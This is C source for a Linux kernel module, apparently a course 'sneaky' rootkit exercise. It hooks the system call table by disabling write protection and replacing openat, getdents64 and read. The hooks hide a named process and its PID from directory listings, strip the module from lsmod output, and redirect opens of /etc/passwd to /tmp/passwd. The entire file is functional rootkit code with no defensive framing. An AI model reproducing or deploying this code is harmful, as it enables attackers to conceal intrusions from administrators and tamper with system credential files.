#include <asm/cacheflush.h>
#include <asm/current.h>  // process information
#include <asm/page.h>
#include <asm/ptrace.h>     // For struct pt_regs
#include <asm/unistd.h>     // for system call constants
#include <linux/highmem.h>  // for changing page permissions
#include <linux/init.h>     // for entry/exit macros
#include <linux/kallsyms.h>
#include <linux/kernel.h>  // for printk and other kernel bits
#include <linux/module.h>  // for all modules
#include <linux/sched.h>

#define PREFIX "sneaky_process"

struct linux_dirent {
    unsigned long d_ino;     /* Inode number */
    unsigned long d_off;     /* Offset to next linux_dirent */
    unsigned short d_reclen; /* Length of this linux_dirent */
    char d_name[];           /* Filename (null-terminated) */
                             /* length is actually (d_reclen - 2 -
                                offsetof(struct linux_dirent, d_name) */
};

// get the sneaky_process pid
static char *sp_pid = "";
module_param(sp_pid, charp, S_IRUSR | S_IWUSR | S_IRGRP | S_IWGRP);
MODULE_PARM_DESC(sp_pid, "sneaky_process_pid");

// This is a pointer to the system call table
static unsigned long *sys_call_table;

// Helper functions, turn on and off the PTE address protection mode
// for syscall_table pointer
int enable_page_rw(void *ptr) {
    unsigned int level;
    pte_t *pte = lookup_address((unsigned long)ptr, &level);
    if (pte->pte & ~_PAGE_RW) {
        pte->pte |= _PAGE_RW;
    }
    return 0;
}

int disable_page_rw(void *ptr) {
    unsigned int level;
    pte_t *pte = lookup_address((unsigned long)ptr, &level);
    pte->pte = pte->pte & ~_PAGE_RW;
    return 0;
}

// 1. Function pointer will be used to save address of the original 'openat'
// syscall.
// 2. The asmlinkage keyword is a GCC #define that indicates this function
//    should expect it find its arguments on the stack (not in registers).
asmlinkage int (*original_openat)(struct pt_regs *);

// Define your new sneaky version of the 'openat' syscall
asmlinkage int sneaky_sys_openat(struct pt_regs *regs) {
    // Implement the sneaky part here
    // test path
    // printk(KERN_INFO "path=%s\n", (char *)(regs->si));

    char *path;
    path = (char *)(regs->si);
    const char *tempPwPath = "/tmp/passwd";

    if (strcmp(path, "/etc/passwd") == 0) {
        // test passwd path
        // printk(KERN_INFO "passwd\n");
        copy_to_user(path, tempPwPath, strlen(tempPwPath));
    }

    return (*original_openat)(regs);
}

// implement getdents64
asmlinkage int (*original_getdents)(struct pt_regs *);

asmlinkage int sneaky_sys_getdents(struct pt_regs *regs) {
    int nread, bpos;
    struct linux_dirent *d;
    struct linux_dirent *nd;

    nread = original_getdents(regs);

    // if (nread == -1) return -1;
    if (nread <= 0) return nread;

    // test
    // printk(KERN_INFO "nread = %d\n", nread);

    for (bpos = 0; bpos < nread;) {
        d = (struct linux_dirent *)((char *)regs->si + bpos);
        // printk(KERN_INFO "d_name=%s:%ld\n", d->d_name, strlen((d->d_name)));

        if ((strcmp(d->d_name + 1, "sneaky_process") == 0) ||
            (strcmp(d->d_name + 1, sp_pid) == 0)) {
            printk(KERN_INFO "d_name = %s\n", d->d_name);
            // printk(KERN_INFO "nread = %d\n", nread);

            nd = (struct linux_dirent *)((char *)regs->si + bpos + d->d_reclen);
            memmove(d, nd, nread - d->d_reclen - bpos);
            nread -= d->d_reclen;
        } else {
            bpos += d->d_reclen;
        }
    }

    return nread;
}

// implement read
asmlinkage ssize_t (*original_read)(struct pt_regs *);

asmlinkage ssize_t sneaky_sys_read(struct pt_regs *regs) {
    ssize_t readBytes = original_read(regs);

    if (readBytes <= 0) {
        return readBytes;
    }

    const char *sneakyMod = "sneaky_mod ";
    char *lsmodRead = (char *)(regs->si);

    char *smStart = strnstr(lsmodRead, sneakyMod, strlen(sneakyMod));

    if (smStart != NULL) {
        ssize_t leftBytes = readBytes - (smStart - lsmodRead);
        char *smEnd = strnstr(smStart, "\n", leftBytes);
        ssize_t smSize;
        if (smEnd != NULL) {
            smSize = (smEnd - smStart + 1);
            leftBytes -= smSize;
            memmove(smStart, smEnd + 1, (size_t)leftBytes);
            readBytes -= smSize;
        } else {
            smSize = leftBytes;
            memmove(smStart, (smStart + smSize), 0);
            readBytes -= smSize;
        }
    }

    return readBytes;
}

// The code that gets executed when the module is loaded
static int initialize_sneaky_module(void) {
    // See /var/log/syslog or use `dmesg` for kernel print output
    printk(KERN_INFO "Sneaky module being loaded.\n");

    // test the sp_pid result
    // printk(KERN_INFO "sneaky_pid: %s\n", sp_pid);

    // Lookup the address for this symbol. Returns 0 if not found.
    // This address will change after rebooting due to protection
    sys_call_table = (unsigned long *)kallsyms_lookup_name("sys_call_table");

    // This is the magic! Save away the original 'openat' system call
    // function address. Then overwrite its address in the system call
    // table with the function address of our new code.
    original_openat = (void *)sys_call_table[__NR_openat];
    // You need to replace other system calls you need to hack here
    // Locate the address of the original getdents function in the system
    // call table
    original_getdents = (void *)sys_call_table[__NR_getdents64];
    original_read = (void *)sys_call_table[__NR_read];

    // Turn off write protection mode for sys_call_table
    enable_page_rw((void *)sys_call_table);

    sys_call_table[__NR_openat] = (unsigned long)sneaky_sys_openat;
    // Replace the getdents system call with our own sneaky_sys_getdents
    // function
    sys_call_table[__NR_getdents64] = (unsigned long)sneaky_sys_getdents;
    sys_call_table[__NR_read] = (unsigned long)sneaky_sys_read;

    // Turn write protection mode back on for sys_call_table
    disable_page_rw((void *)sys_call_table);

    return 0;  // to show a successful load
}

static void exit_sneaky_module(void) {
    printk(KERN_INFO "Sneaky module being unloaded.\n");

    // Turn off write protection mode for sys_call_table
    enable_page_rw((void *)sys_call_table);

    // This is more magic! Restore the original 'open' system call
    // function address. Will look like malicious code was never there!
    sys_call_table[__NR_openat] = (unsigned long)original_openat;
    sys_call_table[__NR_getdents64] = (unsigned long)original_getdents;
    sys_call_table[__NR_read] = (unsigned long)original_read;

    // Turn write protection mode back on for sys_call_table
    disable_page_rw((void *)sys_call_table);
}

module_init(initialize_sneaky_module);  // what's called upon loading
module_exit(exit_sneaky_module);        // what's called upon unloading
MODULE_LICENSE("GPL");